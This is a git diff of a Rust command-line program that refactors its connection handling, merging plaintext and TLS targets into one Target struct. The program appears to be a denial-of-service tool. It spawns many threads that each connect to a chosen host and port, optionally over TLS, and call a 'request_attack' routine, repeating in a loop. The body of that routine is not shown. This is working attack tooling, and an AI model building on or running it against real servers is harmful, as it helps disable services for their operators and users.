@@ -46,30 +46,14 @@ struct Args {
 }
 
 #[derive(Debug, Clone)]
-struct PlaintextTarget {
-    designator: String,
-}
-
-impl PlaintextTarget {
-    fn new(target: String, port: usize) -> Self {
-        PlaintextTarget {
-            designator: format!("{}:{}", target, port)
-        }
-    }
-    fn get_designator(&self) -> &str {
-        &self.designator
-    }
-}
-
-#[derive(Debug, Clone)]
-struct SslTarget {
+struct Target {
     domain: String,
     designator: String,
 }
 
-impl SslTarget {
+impl Target {
     fn new(target: String, port: usize) -> Self {
-        SslTarget {
+        Target {
             domain: format!("{}", target),
             designator: format!("{}:{}", target, port)
         }
@@ -133,73 +117,46 @@ fn main() {
     let timeout = args.flag_timeout;
     let repeat = args.flag_repeat;
     let threads = args.flag_threads;
+    let ssl = args.flag_ssl;
+    // Extract targetting information
+    let mut target = Target::new(args.arg_target, port);
 
-    if args.flag_ssl {
-        // Extract targetting information
-        let mut target = SslTarget::new(args.arg_target, port);
+    // Check for domain override
+    if let Some(domain) = args.flag_domain {
+        target.set_domain(&domain);
+    }
 
-        // Check for domain override
-        if let Some(domain) = args.flag_domain {
-            target.set_domain(&domain);
-        }
+    println!("[CONTROL] Target: {:?}", target);
 
-        println!("[CONTROL] Target: {:?}", target);
-
-        loop {
-            let mut handles = Vec::with_capacity(threads);
-            for _ in 0..threads {
-                let target = target.clone();
-                handles.push(
-                    thread::spawn(move || { 
+    loop {
+        let mut handles = Vec::with_capacity(threads);
+        for _ in 0..threads {
+            let target = target.clone();
+            handles.push(
+                thread::spawn(move || {
+                    // Attempt to connect to the target.
+                    let mut tcp_stream = TcpStream::connect(target.get_designator()).expect("[CONTROL] !!! Couldn't connect. Aborting.");
+                    println!("[CONTROL] Succesfully connected to {}.", target.get_designator());
+                    // If needed, connect SSL to the target.
+                    if ssl {
                         // Attempt to set up SSL
                         let connector = SslConnectorBuilder::new(SslMethod::tls())
                             .expect("[CONTROL] !!! Failed to build SSL functionality.")
                             .build();
                         println!("[CONTROL] Built SSL functionality.");
-                        
-                        // Attempt to connect to the target.
-                        let stream = TcpStream::connect(target.get_designator()).expect("[CONTROL] !!! Couldn't connect. Aborting.");
-                        println!("[CONTROL] Succesfully connected to {}.", target.get_designator());
 
-                        let mut stream = connector.connect(target.get_domain(), stream).expect("[CONTROL] !!! Couldn't connect TLS. Did you provide a domain name, not an IP?");
+                        let mut ssl_stream = connector.connect(target.get_domain(), tcp_stream).expect("[CONTROL] !!! Couldn't connect TLS. Did you provide a domain name, not an IP?");
                         println!("[CONTROL] Successfully connected with TLS.");
-
-                        request_attack(&mut stream, timeout, cycles, finalize);
-                    })
-                );
-            }
-            for handle in handles {
-                let val = handle.join();
-            }
-            if !repeat {break;}
+                        request_attack(&mut ssl_stream, timeout, cycles, finalize);
+                    } else {
+                        request_attack(&mut tcp_stream, timeout, cycles, finalize)
+                    }
+                })
+            );
         }
-
-    } else {
-        // Extract targetting information
-        let target = PlaintextTarget::new(args.arg_target, port);
-        println!("[CONTROL] Target: {}", target.get_designator());
-
-        loop {
-            let mut handles = Vec::with_capacity(threads);
-
-            for _ in 0..threads {
-                // Copy data for new thread to own
-                let target = target.clone();
-                handles.push(
-                    thread::spawn( move || {
-                        // Attempt to connect to the target.
-                        let mut stream = TcpStream::connect(target.get_designator()).expect("[CONTROL] !!! Couldn't connect. Aborting.");
-                        println!("[CONTROL] Succesfully connected to {}.", target.get_designator());
-                    
-                        request_attack(&mut stream, timeout, cycles, finalize);
-                    })
-                );
-            }
-            for handle in handles {
-                handle.join();
-            }
-            if !repeat {break;}
+        for handle in handles {
+            let val = handle.join();
         }
-        
+        if !repeat {break;}
     }
 }
